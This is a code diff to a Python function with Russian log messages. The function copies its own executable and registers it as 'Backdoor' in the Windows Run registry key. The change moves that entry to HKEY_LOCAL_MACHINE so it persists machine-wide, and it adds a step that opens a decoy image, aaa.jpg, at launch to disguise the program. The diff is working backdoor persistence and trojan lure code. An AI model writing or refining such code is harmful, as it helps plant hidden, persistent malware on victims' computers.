@@ -178,29 +178,33 @@ def setup_autorun():
     if not os.path.exists(location):
         shutil.copyfile(sys.executable, location)
         try:
-            logging.info(f"Попытка открыть ключ реестра...")
             with winreg.OpenKey(
-                winreg.HKEY_CURRENT_USER,
+                winreg.HKEY_LOCAL_MACHINE,  # Изменено на локальную машину
                 r"Software\Microsoft\Windows\CurrentVersion\Run",
                 0,
-                winreg.KEY_SET_VALUE,
+                winreg.KEY_SET_VALUE | winreg.KEY_WOW64_64KEY,  # Учет 64-битной системы
             ) as key:
-                logging.info(f"Ключ реестра открыт успешно. Попытка записи...")
                 winreg.SetValueEx(key, "Backdoor", 0, winreg.REG_SZ, location)
-                logging.info(f"[+] Запись в реестр успешно создана: {location}")
+                logging.info(f"[+] Автозапуск добавлен: {location}")
         except PermissionError:
-            logging.error("[!!] Недостаточно прав для записи в реестр")
-        except FileNotFoundError:
-            logging.error("[!!] Ключ реестра не найден")
+            logging.error("[!!] Недостаточно прав для записи в HKEY_LOCAL_MACHINE")
         except Exception as e:
-            logging.error(f"[!!] Другая ошибка: {e}")
+            logging.error(f"[!!] Ошибка записи в реестр: {e}")
+        try:
+            if hasattr(sys, "_MEIPASS"):
+                image_path = os.path.join(sys._MEIPASS, "aaa.jpg")
+            else:
+                image_path = os.path.join(os.getcwd(), "aaa.jpg")
+            if os.path.exists(image_path):
+                subprocess.Popen(["start", image_path], shell=True)
+                logging.info("[+] Картинка открыта при запуске")
+        except Exception as e:
+            logging.error(f"[!!] Ошибка открытия картинки: {e}")
 
-
-    # Попытка открыть картинку
     try:
-        if hasattr(sys, "_MEIPASS"):  # Упакованный файл
+        if hasattr(sys, "_MEIPASS"):
             image_path = os.path.join(sys._MEIPASS, "aaa.jpg")
-        else:  # Рядом с исполняемым файлом
+        else:  
             image_path = os.path.join(os.getcwd(), "aaa.jpg")
 
         if os.path.exists(image_path):
